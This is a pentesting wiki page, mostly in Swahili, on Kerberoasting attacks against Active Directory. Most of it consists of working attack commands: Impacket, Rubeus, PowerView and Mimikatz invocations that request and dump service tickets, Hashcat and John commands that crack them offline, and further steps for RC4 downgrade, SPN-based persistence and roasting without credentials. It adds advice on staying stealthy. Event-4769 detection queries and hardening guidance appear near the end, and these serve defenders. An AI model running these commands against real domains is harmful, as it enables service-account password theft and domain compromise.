# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting inazingatia upatikanaji wa tiketi za TGS, hasa zile zinazohusiana na huduma zinazofanya kazi chini ya akaunti za watumiaji katika Active Directory (AD), ikiondoa akaunti za kompyuta. Ulinzi wa tiketi hizi unatumia funguo zinazotokana na nywila za watumiaji, kuruhusu kuvunja akidi za nywila bila mtandao. Matumizi ya akaunti ya mtumiaji kama huduma yanaonyeshwa na mali isiyo tupu ya ServicePrincipalName (SPN).

Mtumiaji yeyote aliyeidhinishwa wa eneo anaweza kuomba tiketi za TGS, hivyo hakuna ruhusa maalum zinazohitajika.

### Key Points

- Inalenga tiketi za TGS kwa huduma zinazofanya kazi chini ya akaunti za watumiaji (yaani, akaunti zenye SPN iliyowekwa; si akaunti za kompyuta).
- Tiketi zimefungwa kwa funguo inayotokana na nywila ya akaunti ya huduma na zinaweza kuvunjwa bila mtandao.
- Hakuna ruhusa za juu zinazohitajika; akaunti yoyote iliyoidhinishwa inaweza kuomba tiketi za TGS.

> [!WARNING]
> Zana nyingi za umma hupendelea kuomba tiketi za huduma za RC4-HMAC (aina 23) kwa sababu ni rahisi zaidi kuvunja kuliko AES. Hashi za RC4 TGS huanza na `$krb5tgs$23$*`, AES128 na `$krb5tgs$17$*`, na AES256 na `$krb5tgs$18$*`. Hata hivyo, mazingira mengi yanahamia kwenye AES pekee. Usidhani kuwa RC4 pekee ndiyo muhimu.
> Pia, epuka "spray-and-pray" roasting. Kerberoast ya Rubeus ya default inaweza kuuliza na kuomba tiketi za SPN zote na ni kelele. Tambua na lenga wakuu wa kuvutia kwanza.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Vifaa vya vipengele vingi vinavyojumuisha ukaguzi wa kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Orodhesha watumiaji wanaoweza kerberoast
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Omba TGS na uondoe kutoka kwa kumbukumbu
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Vifaa vya kiotomatiki
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Ombi la TGS linazalisha Tukio la Usalama la Windows 4769 (Tiketi ya huduma ya Kerberos ilihitajika).

### OPSEC na mazingira ya AES pekee

- Omba RC4 kwa makusudi kwa akaunti zisizo na AES:
- Rubeus: `/rc4opsec` inatumia tgtdeleg kuorodhesha akaunti zisizo na AES na kuomba tiketi za huduma za RC4.
- Rubeus: `/tgtdeleg` pamoja na kerberoast pia inasababisha maombi ya RC4 inapowezekana.
- Pika akaunti za AES pekee badala ya kufeli kimya:
- Rubeus: `/aes` inaorodhesha akaunti zenye AES imewezeshwa na kuomba tiketi za huduma za AES (etype 17/18).
- Ikiwa tayari unashikilia TGT (PTT au kutoka .kirbi), unaweza kutumia `/ticket:<blob|path>` pamoja na `/spn:<SPN>` au `/spns:<file>` na kupuuza LDAP.
- Kuelekeza, kudhibiti na kelele kidogo:
- Tumia `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` na `/jitter:<1-100>`.
- Chuja kwa nywila zinazoweza kuwa dhaifu kwa kutumia `/pwdsetbefore:<MM-dd-yyyy>` (nywila za zamani) au lenga OUs zenye mamlaka kwa `/ou:<DN>`.

Mifano (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Kufungua
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Ikiwa unadhibiti au unaweza kubadilisha akaunti, unaweza kuifanya iwe kerberoastable kwa kuongeza SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Downgrade akaunti ili kuwezesha RC4 kwa urahisi wa kuvunja (inahitaji ruhusa za kuandika kwenye kitu kilicholengwa):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Detection

Kerberoasting can be stealthy. Hunt for Event ID 4769 from DCs and apply filters to reduce noise:

- Exclude service name `krbtgt` and service names ending with `$` (computer accounts).
- Exclude requests from machine accounts (`*$$@*`).
- Only successful requests (Failure Code `0x0`).
- Track encryption types: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Don’t alert only on `0x17`.

Example PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- Kuweka msingi wa matumizi ya kawaida ya SPN kwa kila mwenyeji/katumiaji; onya juu ya milipuko mikubwa ya maombi tofauti ya SPN kutoka kwa kiongozi mmoja.
- Alama matumizi yasiyo ya kawaida ya RC4 katika maeneo yaliyohardened na AES.

### Mitigation / Hardening

- Tumia gMSA/dMSA au akaunti za mashine kwa huduma. Akaunti zinazodhibitiwa zina nywila za nasibu zenye herufi 120+ na zinabadilishwa kiotomatiki, hivyo kufanya uvunjaji wa nje kuwa mgumu.
- Lazimisha AES kwenye akaunti za huduma kwa kuweka `msDS-SupportedEncryptionTypes` kuwa AES-tu (decimal 24 / hex 0x18) na kisha kubadilisha nywila ili funguo za AES zipatikane.
- Pale inapowezekana, zima RC4 katika mazingira yako na ufuatilie matumizi ya RC4 yaliyofanywa. Kwenye DCs unaweza kutumia thamani ya rejista `DefaultDomainSupportedEncTypes` kuongoza defaults kwa akaunti ambazo hazina `msDS-SupportedEncryptionTypes` zimewekwa. Jaribu kwa kina.
- Ondoa SPNs zisizohitajika kutoka kwa akaunti za watumiaji.
- Tumia nywila ndefu, za nasibu za akaunti za huduma (25+ herufi) ikiwa akaunti zinazodhibitiwa hazipatikani; kataza nywila za kawaida na fanya ukaguzi mara kwa mara.

### Kerberoast bila akaunti ya domain (AS-requested STs)

Mnamo Septemba 2022, Charlie Clark alionyesha kwamba ikiwa kiongozi haahitaji uthibitisho wa awali, inawezekana kupata tiketi ya huduma kupitia KRB_AS_REQ iliyoundwa kwa kubadilisha sname katika mwili wa ombi, kwa ufanisi kupata tiketi ya huduma badala ya TGT. Hii inafanana na AS-REP roasting na haitahitaji akreditif za halali za domain.

Tazama maelezo: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Lazima utoe orodha ya watumiaji kwa sababu bila akreditif halali huwezi kuuliza LDAP kwa mbinu hii.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Related

Ikiwa unalenga watumiaji wa AS-REP roastable, angalia pia:

{{#ref}}
asreproast.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Mwongozo wa Microsoft kusaidia kupunguza Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting documentation: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
